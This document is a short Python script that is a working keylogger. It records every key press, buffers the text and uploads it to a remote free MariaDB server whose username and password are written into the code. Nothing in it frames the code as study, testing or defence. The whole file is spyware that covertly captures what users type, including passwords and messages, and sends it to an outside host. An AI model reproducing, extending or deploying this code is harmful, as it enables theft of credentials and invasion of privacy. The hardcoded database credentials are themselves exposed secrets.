import keyboard
import mariadb

lis = []

conn = mariadb.connect(host="sql10.freesqldatabase.com", user="sql10762104", password="Gmdpwi8RKQ", database="sql10762104")
cursor = conn.cursor()

def eve(e):
    a = e.name
    if len(lis) >= 80 or e.name == "enter":
        tec = ''.join(lis)
        cursor.execute("INSERT INTO digits (teclas) VALUES(?)", (tec,))
        conn.commit()
        lis.clear()
    elif e.name == "backspace" and len(lis) > 0:
        lis.pop()
    elif e.name == "space":
        lis.append(" ")
    elif e.name == "ctrl" or e.name == "shift" or e.name == "alt" or e.name == "tab" or e.name == "caps lock" or e.name == "left" or e.name == "down" or e.name == "right" or e.name == "up":
        lis.append("")
    else:
        lis.append(e.name)

keyboard.on_press(eve)
keyboard.wait('esc')
